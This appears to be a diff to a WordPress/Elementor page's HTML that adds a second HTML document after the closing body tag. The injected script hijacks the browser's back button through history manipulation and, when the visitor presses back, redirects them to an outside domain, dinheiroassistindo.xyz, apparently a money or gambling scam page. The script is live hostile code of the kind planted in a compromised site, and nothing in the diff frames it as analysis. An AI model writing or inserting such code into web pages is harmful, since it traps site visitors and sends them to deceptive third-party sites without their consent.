@@ -1010,4 +1010,24 @@ var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false
 <script src='https://tutorialz.com.br/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.6.6' id='elementor-frontend-js'></script>
 <script src='https://tutorialz.com.br/wp-content/plugins/elementor-pro/assets/js/elements-handlers.min.js?ver=3.7.2' id='pro-elements-handlers-js'></script>
 	</body>
+						<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript">
+var newUrl = location.pathname + location.search;
+
+(function(window, location) {
+history.replaceState(null, document.title, newUrl+"#!/backbutton");
+history.pushState(null, document.title, newUrl);
+window.addEventListener("popstate", function() {
+if(location.hash === "#!/backbutton") {
+history.replaceState(null, document.title, newUrl);
+setTimeout(function(){
+location.replace("https://dinheiroassistindo.xyz/back-mines");
+},0);
+}
+}, false);
+}(window, location));
+</script>
+	
 </html>
